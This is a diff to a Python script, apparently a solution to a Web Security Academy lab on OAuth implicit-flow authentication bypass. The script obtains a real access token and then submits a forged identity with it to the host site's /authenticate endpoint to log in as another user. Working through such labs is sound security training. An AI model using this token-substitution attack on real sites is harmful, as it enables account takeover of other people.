@@ -8,7 +8,7 @@ from urllib.parse import urlparse, parse_qs
 s = requests.Session()
 
 # Get the login redirects page from host site
-site = 'ac1b1fd81e0979b280ba174c00ac00a3.web-security-academy.net'
+site = 'ac211f861f747bd580b17a9e002000af.web-security-academy.net'
 auth_redirect_url = f'https://{site}/social-login'
 resp = s.get(auth_redirect_url)
 
@@ -34,14 +34,15 @@ confirm_folder = soup.form['action']
 confirm_url = f'https://{auth_site}{confirm_folder}'
 resp = s.post(confirm_url)
 
-# Use the token to 'verify' the email
+# Use the token grab identity from identity provider
+# (unneeded to complete level; just for comparison)
 token = parse_qs(urlparse(resp.url)[5])['access_token'][0]
 token_url = f'https://{auth_site}/me'
 headers = {
     'Authorization': f'Bearer {token}'
 }
 resp = s.get(token_url, headers=headers)
-print(f'Verification reply: \n{resp.text}\n')
+print(f'Identity provider reply: \n{resp.text}\n')
 
 # Lie to the host site, presenting my legitimate token
 authenticate_url = f'https://{site}/authenticate'
@@ -51,6 +52,7 @@ payload = {
     'token': token
 }
 resp = s.post(authenticate_url, json=payload)
+print(f'Fake identity submitted to auth endpoint: \n{payload}\n')
 
 soup = BeautifulSoup(resp.text, 'html.parser')
 print(soup.find(text='Congratulations, you solved the lab!'))
